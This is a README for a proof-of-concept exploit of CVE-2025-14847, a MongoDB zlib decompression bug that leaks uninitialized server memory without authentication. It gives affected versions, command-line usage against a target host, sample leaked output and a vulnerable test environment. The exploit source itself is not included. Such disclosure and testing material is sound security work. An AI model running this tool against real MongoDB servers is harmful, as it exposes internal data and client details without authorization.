# mongobleed

**CVE-2025-14847** - MongoDB Unauthenticated Memory Leak Exploit

A proof-of-concept exploit for the MongoDB zlib decompression vulnerability that allows unauthenticated attackers to leak sensitive server memory.

## Vulnerability

A flaw in MongoDB's zlib message decompression returns the allocated buffer size instead of the actual decompressed data length. This allows attackers to read uninitialized memory by:

1. Sending a compressed message with an inflated `uncompressedSize` claim
2. MongoDB allocates a large buffer based on the attacker's claim
3. zlib decompresses actual data into the start of the buffer
4. The bug causes MongoDB to treat the entire buffer as valid data
5. BSON parsing reads "field names" from uninitialized memory until null bytes

## Affected Versions

| Version | Affected | Fixed |
|---------|----------|-------|
| 8.2.x | 8.2.0 - 8.2.2 | 8.2.3 |
| 8.0.x | 8.0.0 - 8.0.16 | 8.0.17 |
| 7.0.x | 7.0.0 - 7.0.27 | 7.0.28 |
| 6.0.x | 6.0.0 - 6.0.26 | 6.0.27 |
| 5.0.x | 5.0.0 - 5.0.31 | 5.0.32 |

## Usage

```bash
# Basic scan (offsets 20-8192)
python3 mongobleed.py --host <target>

# Deep scan for more data
python3 mongobleed.py --host <target> --max-offset 50000

# Custom range
python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000
```

## Options

| Option | Default | Description |
|--------|---------|-------------|
| `--host` | localhost | Target MongoDB host |
| `--port` | 27017 | Target MongoDB port |
| `--min-offset` | 20 | Minimum document length to probe |
| `--max-offset` | 8192 | Maximum document length to probe |
| `--output` | leaked.bin | Output file for leaked data |

## Example Output

```
[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
[*] Author: Joe Desimone - x.com/dez_
[*] Target: localhost:27017
[*] Scanning offsets 20-50000

[+] offset=  117 len=  39: ssions^\u0001�r��*YDr���
[+] offset=16582 len=1552: MemAvailable:    8554792 kB\nBuffers: ...
[+] offset=18731 len=3908: Recv SyncookiesFailed EmbryonicRsts ...

[*] Total leaked: 8748 bytes
[*] Unique fragments: 42
[*] Saved to: leaked.bin
```

## Test Environment

A Docker Compose file is included to spin up a vulnerable MongoDB instance:

```bash
docker-compose up -d
python3 mongobleed.py
```

A kubernetes deployment is included to spin up a vulnerable MongoDB instance:
```bash
podman kube play mongodb.yaml
python3 mongobleed.py
```

## TLS Reverse Proxy

The example pod now exposes MongoDB through a TLS reverse proxy that self-generates a certificate on startup. The proxy listens on `27017` with TLS and forwards traffic to the internal mongod instance on localhost.

- Certificate: self-signed, regenerated at pod start (stored in an in-memory volume)
- Client example: `mongosh --host localhost --port 27071 --tls --tlsAllowInvalidCertificates`
- Direct, non-TLS access is limited to the pod network; external access should go through the TLS endpoint.

## How It Works

The exploit crafts BSON documents with inflated length fields. When the server parses these documents, it reads field names from uninitialized memory until it hits a null byte. Each probe at a different offset can leak different memory regions.

Leaked data may include:
- MongoDB internal logs and state
- WiredTiger storage engine configuration
- System `/proc` data (meminfo, network stats)
- Docker container paths
- Connection UUIDs and client IPs

## References

- [OX Security Advisory](https://www.ox.security/blog/attackers-could-exploit-zlib-to-exfiltrate-data-cve-2025-14847/)
- [MongoDB Fix Commit](https://github.com/mongodb/mongo/commit/505b660a14698bd2b5233bd94da3917b585c5728)

## Author

Joe Desimone - [x.com/dez_](https://x.com/dez_)

## Disclaimer

This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.
